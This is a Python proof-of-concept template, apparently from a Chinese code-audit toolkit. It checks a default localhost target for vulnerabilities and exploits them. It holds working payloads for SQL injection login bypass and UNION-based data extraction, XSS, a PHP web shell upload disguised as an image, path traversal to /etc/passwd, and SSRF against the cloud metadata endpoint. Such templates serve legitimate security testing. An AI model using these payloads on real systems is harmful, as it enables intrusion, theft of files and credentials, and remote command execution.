#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
POC 模板 - 代码审计系统

使用方法:
    1. 复制此模板到新文件，如 pocs/001_sql_injection.py
    2. 修改 TARGET_URL、漏洞类型、利用逻辑
    3. 运行：python pocs/001_sql_injection.py
"""

import requests
import sys
from urllib.parse import urljoin

# ==================== 配置区域 ====================

TARGET_URL = "http://localhost:8080"  # 目标地址
TIMEOUT = 10  # 请求超时 (秒)
VERBOSE = True  # 是否输出详细信息

# ==================== 颜色输出 ====================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

def print_success(msg):
    print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

def print_error(msg):
    print(f"{Colors.RED}[-]{Colors.END} {msg}")

def print_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

def print_info(msg):
    print(f"{Colors.BLUE}[*]{Colors.END} {msg}")

def print_title(msg):
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}{msg}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.END}\n")

# ==================== POC 逻辑 ====================

def check_vulnerability(target_url):
    """
    检测漏洞是否存在
    
    Returns:
        bool: 漏洞是否存在
    """
    try:
        # TODO: 实现漏洞检测逻辑
        # 示例：检测 SQL 注入
        payload = "' OR '1'='1"
        response = requests.post(
            urljoin(target_url, "/login"),
            data={"username": payload, "password": "anything"},
            timeout=TIMEOUT
        )
        
        # 判断是否成功
        if "Welcome" in response.text or "登录成功" in response.text:
            return True
        return False
        
    except requests.exceptions.RequestException as e:
        print_error(f"请求失败：{e}")
        return False

def exploit(target_url):
    """
    利用漏洞
    
    Returns:
        dict: 利用结果
    """
    result = {
        "success": False,
        "data": {}
    }
    
    try:
        # TODO: 实现漏洞利用逻辑
        # 示例：获取数据库版本
        payload = "' UNION SELECT 1, version(), 3, 4 -- "
        response = requests.post(
            urljoin(target_url, "/login"),
            data={"username": payload, "password": "anything"},
            timeout=TIMEOUT
        )
        
        # 提取数据库版本
        if "MySQL" in response.text:
            result["success"] = True
            result["data"]["db_version"] = "MySQL detected"
            
        return result
        
    except requests.exceptions.RequestException as e:
        print_error(f"利用失败：{e}")
        return result

def main():
    """主函数"""
    import argparse
    
    parser = argparse.ArgumentParser(description="POC 脚本")
    parser.add_argument("--target", default=TARGET_URL, help="目标地址")
    parser.add_argument("--check", action="store_true", help="仅检测，不利用")
    parser.add_argument("--exploit", action="store_true", help="执行利用")
    args = parser.parse_args()
    
    print_title("🔍 代码审计系统 - POC 脚本")
    print_info(f"目标：{args.target}")
    print_info(f"模式：{'仅检测' if args.check else '检测 + 利用'}")
    print()
    
    # 检测漏洞
    print_info("正在检测漏洞...")
    if check_vulnerability(args.target):
        print_success("漏洞存在！")
        
        if not args.check:
            # 执行利用
            print_info("正在利用漏洞...")
            result = exploit(args.target)
            
            if result["success"]:
                print_success("利用成功！")
                print_info(f"结果：{result['data']}")
                return 0
            else:
                print_error("利用失败")
                return 1
        return 0
    else:
        print_error("漏洞不存在或无法检测")
        return 1

if __name__ == "__main__":
    sys.exit(main())

# ==================== 其他漏洞类型示例 ====================

"""
# XSS POC 示例
def check_xss(target_url):
    payload = "<script>alert('XSS')</script>"
    response = requests.get(urljoin(target_url, "/search"), 
                           params={"q": payload})
    if payload in response.text:
        return True
    return False

# 文件上传 POC 示例
def check_upload(target_url):
    files = {
        "file": ("shell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg")
    }
    response = requests.post(urljoin(target_url, "/upload"), files=files)
    if "shell.php" in response.text:
        return True
    return False

# 路径遍历 POC 示例
def check_path_traversal(target_url):
    payload = "../../../../etc/passwd"
    response = requests.get(urljoin(target_url, f"/download?file={payload}"))
    if "root:" in response.text:
        return True
    return False

# SSRF POC 示例
def check_ssrf(target_url):
    payload = "http://169.254.169.254/latest/meta-data/"
    response = requests.get(urljoin(target_url, f"/fetch?url={payload}"))
    if "ami-id" in response.text:
        return True
    return False
"""
